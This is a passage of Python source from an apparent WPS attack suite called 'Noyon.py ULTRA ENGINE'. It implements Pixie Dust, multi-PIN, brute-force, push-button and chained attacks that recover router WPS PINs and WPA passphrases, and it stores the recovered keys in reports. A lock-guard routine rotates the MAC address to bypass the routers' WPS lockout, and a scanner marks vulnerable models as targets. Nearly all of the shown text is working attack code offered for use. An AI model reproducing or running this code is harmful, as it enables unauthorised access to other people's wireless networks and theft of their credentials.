                n = int(line.split('Received M')[1])
                self.connection_status.last_m_message = n
                UI.info(f'Received M{n}')
                if n == 5:
                    UI.ok('First half valid')
            elif 'Received WSC_NACK' in line:
                self.connection_status.status = 'WSC_NACK'
                UI.warn('WSC NACK (wrong PIN)')
            elif 'Enrollee Nonce' in line and 'hexdump' in line:
                self.pixie_creds.e_nonce = get_hex(line)
                if pixiemode:
                    UI.pixie(f'E-Nonce: {self.pixie_creds.e_nonce}')
            elif 'DH own Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pkr = get_hex(line)
                if pixiemode:
                    UI.pixie(f'PKR: {self.pixie_creds.pkr}')
            elif 'DH peer Public Key' in line and 'hexdump' in line:
                self.pixie_creds.pke = get_hex(line)
                if pixiemode:
                    UI.pixie(f'PKE: {self.pixie_creds.pke}')
            elif 'AuthKey' in line and 'hexdump' in line:
                self.pixie_creds.authkey = get_hex(line)
                if pixiemode:
                    UI.pixie(f'AuthKey: {self.pixie_creds.authkey}')
            elif 'E-Hash1' in line and 'hexdump' in line:
                self.pixie_creds.e_hash1 = get_hex(line)
                if pixiemode:
                    UI.pixie(f'E-Hash1: {self.pixie_creds.e_hash1}')
            elif 'E-Hash2' in line and 'hexdump' in line:
                self.pixie_creds.e_hash2 = get_hex(line)
                if pixiemode:
                    UI.pixie(f'E-Hash2: {self.pixie_creds.e_hash2}')
            elif 'Network Key' in line and 'hexdump' in line:
                self.connection_status.status = 'GOT_PSK'
                self.connection_status.wpa_psk = (
                    bytes.fromhex(get_hex(line)).decode('utf-8', errors='replace'))
            # NEW: detect WPS completely disabled
            elif 'WPS: Registration failed' in line or 'WPS registration failed' in line:
                self.connection_status.wps_disabled = True
                UI.err('WPS registration refused — likely disabled on router')
            elif 'WPS: Could not connect' in line or 'Could not connect to' in line:
                self.connection_status.wps_unreachable = True
                UI.err('WPS unreachable — router may have WPS off')
        elif ': State: ' in line:
            if '-> SCANNING' in line:
                self.connection_status.status = 'scanning'
                UI.warn('Scanning…')
        elif 'WPS-FAIL' in line and self.connection_status.status:
            self.connection_status.status = 'WPS_FAIL'
            UI.err('WPS-FAIL')
        elif 'Trying to authenticate with' in line:
            self.connection_status.status = 'authenticating'
            if 'SSID' in line:
                self.connection_status.essid = self.__decode_ssid(line)
            UI.warn('Authenticating…')
        elif 'Authentication response' in line:
            UI.ok('Authenticated')
        elif 'Trying to associate with' in line:
            self.connection_status.status = 'associating'
            if 'SSID' in line:
                self.connection_status.essid = self.__decode_ssid(line)
            UI.warn('Associating…')
        elif 'Associated with' in line and self.interface in line:
            bt = line.split()[-1].upper()
            if self.connection_status.essid:
                UI.ok(f'Associated with {bt} ({self.connection_status.essid})')
            else:
                UI.ok(f'Associated with {bt}')
        elif 'EAPOL: txStart' in line:
            self.connection_status.status = 'eapol_start'
            UI.info('EAPOL Start…')
        elif 'EAP entering state IDENTITY' in line:
            UI.info('Identity Request')
        elif 'using real identity' in line:
            UI.info('Identity Response')
        elif bssid and bssid in line and 'level=' in line:
            self.lastPwr = line.split("level=")[1].split(" ")[0]
            if verbose:
                UI.info(f'Signal: {self.lastPwr}')
        elif pbc_mode and 'selected BSS ' in line:
            bt = line.split('selected BSS ')[-1].split()[0].upper()
            self.connection_status.bssid = bt
            UI.info(f'Selected AP: {bt}')
        return True

    @staticmethod
    def __decode_ssid(line):
        try:
            return (codecs.decode("'".join(line.split("'")[1:-1]), 'unicode-escape')
                    .encode('latin1').decode('utf-8', errors='replace'))
        except Exception:
            return ''

    def run_pixiewps(self, showcmd=False, full_range=False):
        UI.warn('Running Pixiewps…')
        cmd = self.pixie_creds.get_pixie_cmd(full_range)
        if showcmd:
            UI.info(cmd)
        try:
            r = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                               stderr=sys.stdout, encoding='utf-8',
                               errors='replace', timeout=Config.PIXIEWPS_TIMEOUT)
            print(r.stdout)
            if r.returncode == 0:
                for line in r.stdout.splitlines():
                    if '[+]' in line and 'WPS pin' in line:
                        pin = line.split(':')[-1].strip().strip("'")
                        return "''" if pin == '<empty>' else pin
        except subprocess.TimeoutExpired:
            UI.err('Pixiewps timeout')
        return False

    def print_credentials(self, wps_pin, wpa_psk, essid):
        UI.divider()
        UI.ok(f"WPS PIN:  {UI.BOLD}{wps_pin}{UI.RESET}")
        UI.ok(f"WPA PSK:  {UI.BOLD}{wpa_psk}{UI.RESET}")
        UI.ok(f"AP SSID:  {UI.BOLD}{essid}{UI.RESET}")
        UI.divider()

    def save_result(self, bssid, essid, wps_pin, wpa_psk):
        filename = self.reports_dir + 'stored'
        dateStr = datetime.now().strftime("%d.%m.%Y %H:%M")
        with open(filename + '.txt', 'a', encoding='utf-8') as f:
            f.write(f'{dateStr}\nBSSID: {bssid}\nESSID: {essid}\n'
                    f'WPS PIN: {wps_pin}\nWPA PSK: {wpa_psk}\n\n')
        write_header = not os.path.isfile(filename + '.csv')
        with open(filename + '.csv', 'a', newline='', encoding='utf-8') as f:
            w = csv.writer(f, delimiter=';', quoting=csv.QUOTE_ALL)
            if write_header:
                w.writerow(['Date', 'BSSID', 'ESSID', 'WPS PIN', 'WPA PSK'])
            w.writerow([dateStr, bssid, essid, wps_pin, wpa_psk])
        json_file = filename + '.json'
        data = []
        if os.path.exists(json_file):
            try:
                with open(json_file, 'r', encoding='utf-8') as jf:
                    data = json.load(jf)
                if not isinstance(data, list):
                    data = []
            except Exception:
                shutil.copy2(json_file, json_file + '.bak')
                data = []
        data.append({'date': dateStr, 'bssid': bssid, 'essid': essid,
                     'wps_pin': wps_pin, 'wpa_psk': wpa_psk})
        with open(json_file, 'w', encoding='utf-8') as jf:
            json.dump(data, jf, indent=4)
        UI.info(f'Saved to reports/')

    def save_pin(self, bssid, pin):
        filename = self.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
        with open(filename, 'w') as f:
            f.write(pin)
        UI.info(f'PIN saved')

    def cleanup(self):
        try:
            self.lock_guard.restore_mac()
        except Exception:
            pass
        try:
            self.retsock.close()
        except Exception:
            pass
        try:
            self.wpas.terminate()
            self.wpas.wait(timeout=2)
        except Exception:
            try:
                self.wpas.kill()
            except Exception:
                pass
        try:
            if self.wpas.stdout:
                self.wpas.stdout.close()
        except Exception:
            pass
        for p in (self.res_socket_file, self.tempconf):
            try:
                if p and os.path.exists(p):
                    os.remove(p)
            except Exception:
                pass
        shutil.rmtree(self.tempdir, ignore_errors=True)

    def __del__(self):
        try:
            self.cleanup()
        except Exception:
            pass


# ═══════════════════════════════════════════════════════════════════
#  ENGINE BASE
# ═══════════════════════════════════════════════════════════════════
class AttackEngine(ABC):
    name = 'Base'
    description = 'Base engine'

    def __init__(self, companion):
        self.c = companion
        self.generator = companion.generator
        self.result = False

    @abstractmethod
    def run(self, bssid, **kwargs) -> bool:
        pass

    def _handle_lock(self):
        state = self.c.lock_guard.record_fail()
        if state == LockState.LOCKED:
            UI.lock(f'WPS lock ({self.c.lock_guard.fail_count} fails)')
            UI.warn(f'Cooldown {Config.LOCK_COOLDOWN}s…')
            time.sleep(Config.LOCK_COOLDOWN)
            if self.c.lock_guard.rotate_mac():
                UI.ok('Lock bypassed')
                return True
            UI.err('Cannot bypass lock')
        return False

    def _reset_wps_state(self):
        self.c.connection_status.wps_disabled = False
        self.c.connection_status.wps_unreachable = False


# ═══════════════════════════════════════════════════════════════════
#  ENGINE: Single PIN
# ═══════════════════════════════════════════════════════════════════
class SinglePinEngine(AttackEngine):
    name = 'Single PIN'
    description = 'Attack with specific PIN'

    def __init__(self, companion, pin):
        super().__init__(companion)
        self.pin = pin

    def run(self, bssid, **kwargs):
        UI.section(f'Engine: {self.name}')
        UI.info(f'Target: {bssid}')
        UI.info(f'PIN: {self.pin}')
        return self._wps_attempt(bssid, self.pin)

    def _wps_attempt(self, bssid, pin):
        c = self.c
        c.pixie_creds.clear()
        c.connection_status.clear()

        try:
            os.set_blocking(c.wpas.stdout.fileno(), False)
            while c.wpas.stdout.read(1024):
                pass
            os.set_blocking(c.wpas.stdout.fileno(), True)
        except Exception:
            pass

        UI.warn(f"Trying PIN '{pin}'…")
        cmd = f'WPS_REG {bssid} {pin}'
        r = c.sendAndReceive(cmd)
        if 'OK' not in r:
            c.connection_status.status = 'WPS_FAIL'
            UI.err(f'Rejected: {r.strip()}')
            self._handle_lock()
            return False

        start = time.time()
        while True:
            try:
                res = c._Companion__handle_wpas(
                    pixiemode=False, pbc_mode=False,
                    verbose=c.print_debug,
                    bssid=bssid.lower() if bssid else '')
            except AttributeError:
                res = c.__handle_wpas(
                    pixiemode=False, pbc_mode=False,
                    verbose=c.print_debug,
                    bssid=bssid.lower() if bssid else '')
            if not res:
                break
            if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break
            if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
                break
            if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
                UI.err('Transaction timeout')
                c.connection_status.status = 'WPS_FAIL'
                break

        c.sendOnly('WPS_CANCEL')

        if c.connection_status.status == 'GOT_PSK':
            c.lock_guard.record_success()
            c.print_credentials(pin, c.connection_status.wpa_psk, c.connection_status.essid)
            if c.save_result:
                c.save_result(bssid, c.connection_status.essid, pin, c.connection_status.wpa_psk)
            return True
        elif c.connection_status.status == 'WPS_FAIL':
            self._handle_lock()
        return False


# ═══════════════════════════════════════════════════════════════════
#  ENGINE: Multi-PIN
# ═══════════════════════════════════════════════════════════════════
class MultiPinEngine(AttackEngine):
    name = 'Multi-PIN'
    description = 'Try all suggested PINs'

    def run(self, bssid, **kwargs):
        pins = self.generator.getSuggested(bssid)
        vendor = WPSpin.get_vendor(bssid)
        UI.section(f'Engine: {self.name}')
        UI.info(f'Target: {bssid}')
        UI.info(f'Vendor: {UI.BOLD}{vendor}{UI.RESET}')
        UI.info(f'Candidates: {len(pins)}')
        UI.divider()

        single = SinglePinEngine(self.c, '')
        for i, entry in enumerate(pins, 1):
            UI.plain()
            UI.warn(f'[{i}/{len(pins)}] {entry["name"]} → {entry["pin"]}')

            if self.c.lock_guard.is_locked():
                if not self.c.lock_guard.rotate_mac():
                    UI.err('Cannot proceed — locked')
                    return False

            single.pin = entry['pin']
            if single._wps_attempt(bssid, entry['pin']):
                return True

            # If WPS disabled on router, don't waste time
            if self.c.connection_status.wps_disabled:
                UI.err('WPS disabled on router — Multi-PIN cannot proceed')
                return False

        UI.err('All PINs failed')
        return False


# ═══════════════════════════════════════════════════════════════════
#  ENGINE: Pixie Dust
# ═══════════════════════════════════════════════════════════════════
class PixieDustEngine(AttackEngine):
    name = 'Pixie Dust'
    description = 'Offline PIN recovery'

    def __init__(self, companion, showcmd=False, force=False):
        super().__init__(companion)
        self.showcmd = showcmd
        self.force = force

    def run(self, bssid, **kwargs):
        UI.section(f'Engine: {self.name}')
        UI.info(f'Target: {bssid}')
        UI.info(f'Vendor: {UI.BOLD}{WPSpin.get_vendor(bssid)}{UI.RESET}')

        try:
            fn = self.c.pixiewps_dir + f'{bssid.replace(":", "").upper()}.run'
            with open(fn, 'r') as f:
                cached = f.readline().strip()
            ans = input(f'{UI.CYAN}[?] Use cached PIN {cached}? [n/Y]: {UI.RESET}')
            if ans.lower() != 'n':
                return self._try_pin(bssid, cached, store_on_fail=True)
            else:
                raise FileNotFoundError
        except FileNotFoundError:
            pass

        dummy = self.generator.getLikely(bssid) or '12345670'
        UI.warn(f'Starting handshake with {dummy}…')

        if not self._do_handshake(bssid, dummy):
            UI.err('Handshake failed')
            return False

        if self.c.connection_status.wps_disabled:
            UI.err('WPS is disabled on this router — Pixie Dust impossible')
            return False

        if not self.c.pixie_creds.got_all():
            UI.err('Not enough data (router may have WPS off)')
            return False

        pin = self.c.run_pixiewps(self.showcmd, self.force)
        if not pin:
            UI.err('Pixie Dust failed (firmware likely patched)')
            return False

        UI.ok(f'Recovered PIN: {UI.BOLD}{pin}{UI.RESET}')
        return self._try_pin(bssid, pin, store_on_fail=True)

    def _do_handshake(self, bssid, pin):
        c = self.c
        c.pixie_creds.clear()
        c.connection_status.clear()

        try:
            os.set_blocking(c.wpas.stdout.fileno(), False)
            while c.wpas.stdout.read(1024):
                pass
            os.set_blocking(c.wpas.stdout.fileno(), True)
        except Exception:
            pass

        r = c.sendAndReceive(f'WPS_REG {bssid} {pin}')
        if 'OK' not in r:
            UI.err(f'Handshake rejected: {r.strip()}')
            self._handle_lock()
            return False

        start = time.time()
        while True:
            try:
                res = c._Companion__handle_wpas(
                    pixiemode=True, pbc_mode=False,
                    verbose=c.print_debug,
                    bssid=bssid.lower() if bssid else '')
            except AttributeError:
                res = c.__handle_wpas(
                    pixiemode=True, pbc_mode=False,
                    verbose=c.print_debug,
                    bssid=bssid.lower() if bssid else '')
            if not res:
                break
            if c.connection_status.status in ('WSC_NACK', 'GOT_PSK', 'WPS_FAIL'):
                break
            if c.connection_status.wps_disabled or c.connection_status.wps_unreachable:
                break
            if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
                UI.err('Handshake timeout')
                c.connection_status.status = 'WPS_FAIL'
                break

        c.sendOnly('WPS_CANCEL')

        if c.connection_status.status == 'GOT_PSK':
            return True
        elif c.connection_status.status == 'WPS_FAIL':
            self._handle_lock()
        return True

    def _try_pin(self, bssid, pin, store_on_fail=False):
        for attempt in range(1, Config.PSK_RETRY_COUNT + 1):
            UI.plain()
            UI.warn(f'PSK retry {attempt}/{Config.PSK_RETRY_COUNT}')
            single = SinglePinEngine(self.c, pin)
            if single._wps_attempt(bssid, pin):
                return True
            if self.c.connection_status.isFirstHalfValid():
                UI.warn('PIN accepted, PSK failed')
                if attempt < Config.PSK_RETRY_COUNT:
                    time.sleep(Config.PSK_RETRY_DELAY)
        if store_on_fail:
            self.c.save_pin(bssid, pin)
        return False


# ═══════════════════════════════════════════════════════════════════
#  ENGINE: Brute Force
# ═══════════════════════════════════════════════════════════════════
class BruteForceEngine(AttackEngine):
    name = 'Brute Force'
    description = 'Online PIN bruteforce'

    def __init__(self, companion, start_pin=None, delay=None):
        super().__init__(companion)
        self.start_pin = start_pin
        self.delay = delay
        self.bf_status = BruteforceStatus()

    def run(self, bssid, **kwargs):
        UI.section(f'Engine: {self.name}')
        UI.info(f'Target: {bssid}')
        UI.info(f'Vendor: {UI.BOLD}{WPSpin.get_vendor(bssid)}{UI.RESET}')

        if (not self.start_pin) or (len(self.start_pin) < 4):
            try:
                fn = self.c.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
                with open(fn, 'r') as f:
                    ans = input(f'{UI.CYAN}[?] Restore session? [n/Y]: {UI.RESET}')
                    if ans.lower() != 'n':
                        mask = f.readline().strip()
                    else:
                        raise FileNotFoundError
            except FileNotFoundError:
                mask = '0000'
        else:
            mask = self.start_pin[:7]

        try:
            self.bf_status.mask = mask
            if len(mask) == 4:
                f_half = self._first_half(bssid, mask)
                if f_half:
                    self._second_half(bssid, f_half, '001')
            elif len(mask) == 7:
                self._second_half(bssid, mask[:4], mask[4:])
            return self.result
        except KeyboardInterrupt:
            UI.plain()
            UI.warn('Aborting…')
            fn = self.c.sessions_dir + f'{bssid.replace(":", "").upper()}.run'
            with open(fn, 'w') as f:
                f.write(self.bf_status.mask)
            UI.info(f'Session saved')
            raise

    def _first_half(self, bssid, start):
        ck = self.generator.checksum
        f_half = start
        while int(f_half) < 10000:
            t = int(f_half + '000')
            pin = f'{f_half}000{ck(t)}'
            if self.c.lock_guard.is_locked():
                if not self.c.lock_guard.rotate_mac():
                    return False
            engine = SinglePinEngine(self.c, pin)
            if engine._wps_attempt(bssid, pin):
                self.result = True
                return False
            if self.c.connection_status.wps_disabled:
                UI.err('WPS disabled — stopping bruteforce')
                return False
            if self.c.connection_status.isFirstHalfValid():
                UI.ok('First half found')
                return f_half
            if self.c.connection_status.status == 'WPS_FAIL':
                time.sleep(Config.BRUTEFORCE_FAIL_PAUSE)
            f_half = str(int(f_half) + 1).zfill(4)
            self.bf_status.registerAttempt(f_half)
            if self.delay:
                time.sleep(self.delay)
        UI.err('First half not found')
        return False

    def _second_half(self, bssid, f_half, s_half):
        ck = self.generator.checksum
        while int(s_half) < 1000:
            t = int(f_half + s_half)
            pin = f'{f_half}{s_half}{ck(t)}'
            if self.c.lock_guard.is_locked():
                if not self.c.lock_guard.rotate_mac():
                    return False
            engine = SinglePinEngine(self.c, pin)
            if engine._wps_attempt(bssid, pin):
                self.result = True
                return pin
            if self.c.connection_status.last_m_message > 6:
                return pin
            s_half = str(int(s_half) + 1).zfill(3)
            self.bf_status.registerAttempt(f_half + s_half)
            if self.delay:
                time.sleep(self.delay)
        return False


# ═══════════════════════════════════════════════════════════════════
#  ENGINE: PBC
# ═══════════════════════════════════════════════════════════════════
class PBCEngine(AttackEngine):
    name = 'PBC'
    description = 'WPS Push Button'

    def run(self, bssid=None, **kwargs):
        UI.section(f'Engine: {self.name}')
        c = self.c
        if bssid:
            UI.warn(f'PBC to {bssid}…')
            cmd = f'WPS_PBC {bssid}'
        else:
            UI.warn('PBC (any)…')
            cmd = 'WPS_PBC'
        c.pixie_creds.clear()
        c.connection_status.clear()
        try:
            os.set_blocking(c.wpas.stdout.fileno(), False)
            while c.wpas.stdout.read(1024):
                pass
            os.set_blocking(c.wpas.stdout.fileno(), True)
        except Exception:
            pass
        r = c.sendAndReceive(cmd)
        if 'OK' not in r:
            UI.err(f'PBC rejected: {r.strip()}')
            return False
        start = time.time()
        while True:
            try:
                res = c._Companion__handle_wpas(
                    pixiemode=False, pbc_mode=True,
                    verbose=c.print_debug, bssid='')
            except AttributeError:
                res = c.__handle_wpas(
                    pixiemode=False, pbc_mode=True,
                    verbose=c.print_debug, bssid='')
            if not res:
                break
            if c.connection_status.status in ('GOT_PSK', 'WPS_FAIL'):
                break
            if time.time() - start > Config.WPS_TRANSACTION_TIMEOUT:
                UI.err('PBC timeout')
                break
        c.sendOnly('WPS_CANCEL')
        if c.connection_status.status == 'GOT_PSK':
            target = c.connection_status.bssid or bssid or 'Unknown'
            c.print_credentials('<PBC>', c.connection_status.wpa_psk, c.connection_status.essid)
            if c.save_result:
                c.save_result(target, c.connection_status.essid, '<PBC>', c.connection_status.wpa_psk)
            return True
        return False


# ═══════════════════════════════════════════════════════════════════
#  ENGINE: AutoChain — NEW! Cascade: Pixie → Multi-PIN → Bruteforce
# ═══════════════════════════════════════════════════════════════════
class AutoChainEngine(AttackEngine):
    name = 'Auto Chain'
    description = 'Cascade Pixie → Multi-PIN → Bruteforce'

    def __init__(self, companion, showcmd=False, force=False, allow_bruteforce=True):
        super().__init__(companion)
        self.showcmd = showcmd
        self.force = force
        self.allow_bruteforce = allow_bruteforce

    def run(self, bssid, **kwargs):
        UI.section(f'Engine: {self.name}')
        UI.info(f'Target: {bssid}')
        UI.info(f'Vendor: {UI.BOLD}{WPSpin.get_vendor(bssid)}{UI.RESET}')
        UI.info(f'Chain: Pixie → Multi-PIN' +
                (' → Bruteforce' if self.allow_bruteforce else ''))

        # ── Stage 1: Pixie Dust ───────────────────────────────────
        UI.stage('Stage 1/3: Pixie Dust')
        pixie = PixieDustEngine(self.c, self.showcmd, self.force)
        try:
            if pixie.run(bssid):
                return True
        except Exception as e:
            UI.err(f'Pixie exception: {e}')

        if self.c.connection_status.wps_disabled:
            UI.err('Router has WPS disabled — aborting chain')
            return False

        # ── Stage 2: Multi-PIN ────────────────────────────────────
        UI.stage('Stage 2/3: Multi-PIN')
        multi = MultiPinEngine(self.c)
        try:
            if multi.run(bssid):
                return True
        except Exception as e:
            UI.err(f'Multi-PIN exception: {e}')

        if self.c.connection_status.wps_disabled:
            UI.err('Router has WPS disabled — aborting chain')
            return False

        # ── Stage 3: Bruteforce (optional) ────────────────────────
        if self.allow_bruteforce:
            UI.stage('Stage 3/3: Bruteforce')
            try:
                ans = input(f'{UI.CYAN}[?] Start bruteforce? '
                            f'(slow, 2-10 hours) [n/Y]: {UI.RESET}')
                if ans.lower() != 'n':
                    br = BruteForceEngine(self.c)
                    if br.run(bssid):
                        return True
            except KeyboardInterrupt:
                UI.warn('Bruteforce skipped')

        UI.err('AutoChain exhausted all stages')
        return False


# ═══════════════════════════════════════════════════════════════════
#  ENGINE REGISTRY
# ═══════════════════════════════════════════════════════════════════
class EngineRegistry:
    ENGINES = {
        'single':      SinglePinEngine,
        'multi-pin':   MultiPinEngine,
        'pixie':       PixieDustEngine,
        'bruteforce':  BruteForceEngine,
        'pbc':         PBCEngine,
        'auto':        AutoChainEngine,
    }

    @classmethod
    def list_engines(cls):
        UI.section('Available Engines')
        for name, cls in cls.ENGINES.items():
            print(f'  {UI.BOLD}{name:<15}{UI.RESET} {cls.description}')

    @classmethod
    def get(cls, name):
        return cls.ENGINES.get(name)


# ═══════════════════════════════════════════════════════════════════
#  WIFI SCANNER — FIXED
# ═══════════════════════════════════════════════════════════════════
class WiFiScanner:
    def __init__(self, interface, vuln_list=None, reverse_scan=False):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.reverse_scan = reverse_scan
        reports_fname = os.path.dirname(os.path.realpath(__file__)) + '/reports/stored.csv'
        try:
            with open(reports_fname, 'r', newline='', encoding='utf-8', errors='replace') as f:
                csvReader = csv.reader(f, delimiter=';', quoting=csv.QUOTE_ALL)
                next(csvReader)
                self.stored = [(row[1], row[2]) for row in csvReader]
        except FileNotFoundError:
            self.stored = []

    def iw_scanner(self):
        def h_net(line, result, networks):
            networks.append({'Security type': 'Unknown', 'WPS': False,
                             'WPS locked': False, 'Model': '',
                             'Model number': '', 'Device name': '',
                             'BSSID': result.group(1).upper()})
        def h_essid(line, result, networks):
            networks[-1]['ESSID'] = self._decode(result.group(1))
        def h_level(line, result, networks):
            networks[-1]['Level'] = int(float(result.group(1)))
        def h_sec(line, result, networks):
            sec = networks[-1]['Security type']
            if result.group(1) == 'capability':
                sec = 'WEP' if 'Privacy' in result.group(2) else 'Open'
            elif sec == 'WEP':
                if result.group(1) == 'RSN': sec = 'WPA2'
                elif result.group(1) == 'WPA': sec = 'WPA'
            elif sec == 'WPA':
                if result.group(1) == 'RSN': sec = 'WPA/WPA2'
            elif sec == 'WPA2':
                if result.group(1) == 'WPA': sec = 'WPA/WPA2'
            networks[-1]['Security type'] = sec
        def h_wps(line, result, networks):
            networks[-1]['WPS'] = result.group(1)
        def h_wpslock(line, result, networks):
            if int(result.group(1), 16):
                networks[-1]['WPS locked'] = True
        def h_model(line, result, networks):
            networks[-1]['Model'] = self._decode(result.group(1))
        def h_modelno(line, result, networks):
            networks[-1]['Model number'] = self._decode(result.group(1))
        def h_device(line, result, networks):
            networks[-1]['Device name'] = self._decode(result.group(1))

        cmd = f'iw dev {self.interface} scan'
        try:
            proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                                  stderr=subprocess.STDOUT, encoding='utf-8',
                                  errors='replace', timeout=Config.SCAN_TIMEOUT)
        except subprocess.TimeoutExpired:
            UI.err('Scan timeout')
            return False
        if proc.returncode != 0:
            UI.err('iw scan failed')
            return False

        networks = []
        matchers = {
            re.compile(r'BSS (\S+)( )?\(on \w+\)'): h_net,
            re.compile(r'SSID: (.*)'): h_essid,
            re.compile(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm'): h_level,
            re.compile(r'(capability): (.+)'): h_sec,
            re.compile(r'(RSN):\t [*] Version: (\d+)'): h_sec,
            re.compile(r'(WPA):\t [*] Version: (\d+)'): h_sec,
            re.compile(r'WPS:\t [*] Version: (([0-9]*[.])?[0-9]+)'): h_wps,
            re.compile(r' [*] AP setup locked: (0x[0-9]+)'): h_wpslock,
            re.compile(r' [*] Model: (.*)'): h_model,
            re.compile(r' [*] Model Number: (.*)'): h_modelno,
            re.compile(r' [*] Device name: (.*)'): h_device,
        }
        for line in proc.stdout.splitlines():
            if line.startswith('command failed:'):
                UI.err(f'Scan error: {line}')
                return False
            line = line.strip('\t')
            for regexp, handler in matchers.items():
                res = re.match(regexp, line)
                if res:
                    handler(line, res, networks)

        networks = [n for n in networks if n['WPS']]
        if not networks:
            return False

        networks.sort(key=lambda x: x['Level'], reverse=True)
        network_list = {(i + 1): n for i, n in enumerate(networks)}

        def color(text, c):
            codes = {'green': UI.GREEN, 'red': UI.RED, 'yellow': UI.YELLOW}
            return f'{codes.get(c, "")}{text}{UI.RESET}'

        UI.section('WPS Networks Detected')
        if self.vuln_list:
            print(f'{color("●", "green")} Vulnerable  '
                  f'{color("●", "red")} Locked  '
                  f'{color("●", "yellow")} Stored')
            print()

        # Compact for Termux
        print(f'  {UI.GRAY}{"#":<3}{"BSSID":<18}{"ESSID":<16}'
              f'{"Sec":<8}{"PWR":<5}{"Vendor":<12}Model{UI.RESET}')
        print(f'  {UI.GRAY}{"─" * 62}{UI.RESET}')

        items = list(network_list.items())
        if self.reverse_scan:
            items = items[::-1]
        for n, network in items:
            model = '{} {}'.format(network['Model'], network['Model number']).strip() or '-'
            essid = truncate(network.get('ESSID', 'HIDDEN'), 14)
            vendor = truncate(WPSpin.get_vendor(network['BSSID']), 11)
            model_s = truncate(model, 18)
            line = (f'  {n:<3}{network["BSSID"]:<18}{essid} '
                    f'{network["Security type"]:<7} '
                    f'{str(network["Level"]):<4} {vendor} {model_s}')
            if (network['BSSID'], network.get('ESSID', 'HIDDEN')) in self.stored:
                print(color(line, 'yellow'))
            elif network['WPS locked']:
                print(color(line, 'red'))
            elif self.vuln_list and any(v.strip() and v.strip() in model
                                        for v in self.vuln_list):
                print(color(line, 'green'))
            else:
                print(line)

        UI.divider()
        UI.info(f'Total: {len(networks)} WPS networks')
        return network_list

    @staticmethod
    def _decode(d):
        return (codecs.decode(d, 'unicode-escape')
                .encode('latin1').decode('utf-8', errors='replace'))

    def prompt_network(self):
        networks = self.iw_scanner()
        if not networks:
            UI.err('No WPS networks found.')
            return ''
        while True:
            try:
                no = input(f'{UI.CYAN}Select target (Enter = refresh): {UI.RESET}').strip()
                if no.lower() in ('r', '0', ''):
                    return self.prompt_network()
                if int(no) in networks.keys():
                    return networks[int(no)]['BSSID']
                raise IndexError
            except Exception:
                UI.err('Invalid number')


def ifaceUp(iface, down=False):
    action = 'down' if down else 'up'
    res = subprocess.run(f'ip link set {iface} {action}', shell=True,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    return res.returncode == 0


def die(msg):
    UI.err(msg)
    sys.exit(1)


def show_banner():
    os.system('clear' if os.name != 'nt' else 'cls')
    if Figlet:
        try:
            print(f'{UI.CYAN}{Figlet(font="slant").renderText("NOYON")}{UI.RESET}')
        except Exception:
            pass
    print(f'{UI.GRAY}═══════════════════════════════════════════════════════════════{UI.RESET}')
    print(f'  {UI.BOLD}{UI.WHITE}Noyon.py{UI.RESET}  ·  {UI.CYAN}ULTRA ENGINE Edition{UI.RESET}')
    print(f'  {UI.GRAY}Author:{UI.RESET} Noyon  ·  {UI.GRAY}Owner:{UI.RESET} @NOYONRRP  ·  {UI.GRAY}Channel:{UI.RESET} @SGCODEX')
    print(f'  {UI.GRAY}Architecture:{UI.RESET} External Engines | AutoChain | Lock Guard | MAC Rotation')
    print(f'{UI.GRAY}═══════════════════════════════════════════════════════════════{UI.RESET}')
    print()


if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser(description='Noyon.py ULTRA ENGINE — WPS Attack Suite')
    parser.add_argument('-i', '--interface', type=str, required=True)
    parser.add_argument('-b', '--bssid', type=str)
    parser.add_argument('-p', '--pin', type=str)
    parser.add_argument('-K', '--pixie-dust', action='store_true')
    parser.add_argument('-B', '--bruteforce', action='store_true')
    parser.add_argument('-M', '--multi-pin', action='store_true')
    parser.add_argument('--auto', action='store_true',
                        help='[Engine] AutoChain: Pixie → Multi-PIN → Bruteforce')
    parser.add_argument('--pbc', '--push-button-connect', action='store_true')
    parser.add_argument('-F', '--pixie-force', action='store_true')
    parser.add_argument('-X', '--show-pixie-cmd', action='store_true')
    parser.add_argument('-d', '--delay', type=float)
    parser.add_argument('-w', '--write', action='store_true')
    parser.add_argument('--no-mac-rotate', action='store_true')
    parser.add_argument('--lock-threshold', type=int, default=3)
    parser.add_argument('--lock-cooldown', type=int, default=30)
    parser.add_argument('-l', '--loop', action='store_true')
    parser.add_argument('-r', '--reverse-scan', action='store_true')
    parser.add_argument('--iface-down', action='store_true')
    parser.add_argument('--mtk-wifi', action='store_true')
    parser.add_argument('-v', '--verbose', action='store_true')
    parser.add_argument('--list-engines', action='store_true')
    parser.add_argument('--vuln-list', type=str,
                        default=os.path.dirname(os.path.realpath(__file__)) + '/vulnwsc.txt')
    args = parser.parse_args()

    if args.list_engines:
        EngineRegistry.list_engines()
        sys.exit(0)

    if sys.hexversion < 0x03060F0:
        die('Requires Python 3.6+')
    if os.getuid() != 0:
        die('Run as root')

    Config.MAC_ROTATION_ENABLED = not args.no_mac_rotate
    Config.WPS_FAIL_THRESHOLD = args.lock_threshold
    Config.LOCK_COOLDOWN = args.lock_cooldown

    if args.mtk_wifi:
        wmt = Path('/dev/wmtWifi')
        if not wmt.is_char_device():
            die('MediaTek Wi-Fi not found')
        wmt.chmod(0o644)
        wmt.write_text('1')

    if not ifaceUp(args.interface):
        die(f'Cannot bring up {args.interface}')

    show_banner()
    companion = None
    exit_code = 0

    try:
        while True:
            try:
                companion = Companion(args.interface, args.write,
                                      print_debug=args.verbose,
                                      bssid=args.bssid or '')

                if not args.pbc and not args.bssid:
                    try:
                        with open(args.vuln_list, 'r', encoding='utf-8') as f:
                            vuln_list = f.read().splitlines()
                    except FileNotFoundError:
                        vuln_list = []
                    scanner = WiFiScanner(args.interface, vuln_list,
                                          reverse_scan=args.reverse_scan)
                    args.bssid = scanner.prompt_network()

                engine = None
                if args.pbc:
                    engine = PBCEngine(companion)
                elif args.bruteforce:
                    engine = BruteForceEngine(companion, args.pin, args.delay)
